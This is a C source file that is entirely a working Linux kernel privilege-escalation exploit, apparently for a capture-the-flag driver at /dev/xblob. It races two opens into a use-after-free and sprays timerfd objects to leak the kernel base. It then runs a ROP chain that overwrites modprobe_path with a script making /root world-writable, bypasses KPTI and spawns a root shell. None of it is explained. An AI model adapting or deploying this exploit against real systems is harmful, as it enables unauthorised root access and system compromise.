#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <sys/types.h>
#include <unistd.h>

int fd1 = -1, fd2 = -1; 
unsigned long user_cs, user_ss, user_rsp, user_rflags;

/*************************************************************************
    0xffffffff810b3291: push rdi ; add byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret  ;  (1 found)
    0xffffffff81287e29: add rsp, 0x28 ; ret  ;  (1 found)
    0xffffffff81800e26 <swapgs_restore_regs_and_return_to_usermode+22>:    mov    rdi,rsp
    0xffffffff812755bb: pop rdx ; pop rdi ; ret  ;  (1 found)
    0xffffffff81044f66: mov qword [rdi], rdx ; ret  ;  (3 found)
    0xffffffff81275556: pop rdx ; ret  ;  (1 found)
    0xffffffff81261fb6: mov qword [rdi+0x10], rdx ; ret  ;  (1 found)
    0xffffffff810f2f7e: mov qword [rdi+0x28], rdx ; ret  ;  (1 found)
    0xffffffff81027201: mov qword [rdi+0x38], rdx ; ret  ;  (1 found)
    0xffffffff81000da0: pop rsi ; pop r15 ; pop rbp ; ret  ;  (7543 found)
    0xffffffff810ad6d1: xor edx, edx ; ret  ;  (1 found)
    0xffffffff81044f63: add edx, 0x01 ; mov qword [rdi], rdx ; ret  ;  (1 found)
*************************************************************************/
unsigned long push_rdi_add_prbxP41h_bl_pop_rsp_r13_rbp = 0xb3291;
unsigned long add_rsp_28h = 0x287e29;
unsigned long bypass_kpti = 0x800e26;
unsigned long pop_rdx_rdi = 0x2755bb;
unsigned long mov_prdi_rdx = 0x44f66;
unsigned long pop_rdx = 0x275556;
unsigned long mov_prdiP10h_rdx = 0x261fb6;
unsigned long mov_prdiP28h_rdx = 0xf2f7e;
unsigned long mov_prdiP38h_rdx = 0x27201;
unsigned long pop_rsi_r15_rbp = 0xda0;
unsigned long xor_edx_edx = 0xad6d1;
unsigned long add_edx_1_mov_prdi_rdx = 0x44f63;

unsigned long modprobe_path = 0xe37e20;
unsigned long timerfd_tmrproc = 0x190990;

void save_state(){
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory"
    );
}

void get_shell(){
    printf("[+] win\n");
    system("/bin/sh");
}

void* race_open(){
    fd2 = open("/dev/xblob", O_RDWR);
}

int create_timer(){
    struct itimerspec its = {{0, 0}, {100, 0}};
    int tfd = timerfd_create(CLOCK_REALTIME, 0);
    timerfd_settime(tfd, 0, &its, 0);
    return tfd;
}

int spray(){
    int tfd[0x100];
    char zero[0x100] = {};
    char buf[0x100] = {};

    write(fd2, zero, sizeof(zero));

    for(int i=0; i<0x100; i++){
        tfd[i] = create_timer();
        if(tfd[i] == -1){
            for(int j=0; j<i; j++) close(tfd[j]);
            return -1;
        }
        read(fd2, buf, sizeof(buf));
        if(memcmp(buf, zero, sizeof(zero) != 0)){
            for(int j=0; j<i; j++) close(tfd[j]);
            return i;
        }
    }
    for(int i=0; i<0x100; i++) close(tfd[i]);
    return -1;
}

int main() {
    pthread_t thread;
    char buf[0x100];
    unsigned long kbase, g_buf;

    while(fd1 < 0 || fd2 < 0) {
        fd1 = -1;
        fd2 = -1;

        pthread_create(&thread, NULL, race_open, NULL);
        fd1 = open("/dev/xblob", O_RDWR);
        pthread_join(thread, NULL);

        if(fd1 < 0 || fd2 < 0) {
            close(fd1);
            close(fd2);
        }
    }
    printf("[+] Race (%d, %d)\n", fd1, fd2);

    close(fd1);
    
    while(spray() < 0);
    printf("[+] Spray\n");

    read(fd2, buf, sizeof(buf));
    kbase = *(unsigned long*)&buf[0x28] - timerfd_tmrproc;
    g_buf = *(unsigned long*)&buf[0x90] - 0x90;
    printf("[+] kbase = 0x%lx\n", kbase);
    printf("[+] g_buf = 0x%lx\n", g_buf);


    save_state();
    system("echo -e '#!/bin/sh\nchmod -R 777 /root' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -e '\xff\xff\xff\xff' > /tmp/y");
    system("chmod +x /tmp/y");

    *(unsigned long*)&buf[0x00] = 1;    // __rb_parent_color
    *(unsigned long*)&buf[0x08] = 0;    // rb_right
    *(unsigned long*)&buf[0x10] = add_rsp_28h + kbase;      // rb_left
    *(unsigned long*)&buf[0x18] = 0x0000001d6900f375;       // expires
    *(unsigned long*)&buf[0x20] = 0x0000001d6900f375;       // _softexpires
    *(unsigned long*)&buf[0x28] = push_rdi_add_prbxP41h_bl_pop_rsp_r13_rbp + kbase;     // function
    *(unsigned long*)&buf[0x38] = 0;    // state

    unsigned long *chain = (unsigned long*)&buf[0x40];
    // modprobe_path = "/tmp/x"
    *chain++ = pop_rdx_rdi + kbase;
    *chain++ = 0x782f706d742f;
    *chain++ = modprobe_path + kbase;
    *chain++ = mov_prdi_rdx + kbase;

    // function = timerfd_tmrproc
    *chain++ = pop_rdx_rdi + kbase;
    *chain++ = timerfd_tmrproc + kbase;
    *chain++ = g_buf;
    *chain++ = mov_prdiP28h_rdx + kbase;

    *chain++ = pop_rsi_r15_rbp + kbase;
    chain++;
    chain++;
    chain++;

    // rb_left = NULL
    *chain++ = xor_edx_edx + kbase;
    *chain++ = mov_prdiP10h_rdx + kbase;

    *chain++ = add_edx_1_mov_prdi_rdx + kbase;  // __rb_parent_color = 1
    *chain++ = mov_prdiP38h_rdx + kbase;        // state = 1

    // Return to userland
    *chain++ = bypass_kpti + kbase;
    *chain++ = 0xdeadbeef;
    *chain++ = 0xdeadbeef;
    *chain++ = (unsigned long)&get_shell;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;

    write(fd2, buf, sizeof(buf));
    printf("[+] ROP\n");
    while(1);
}
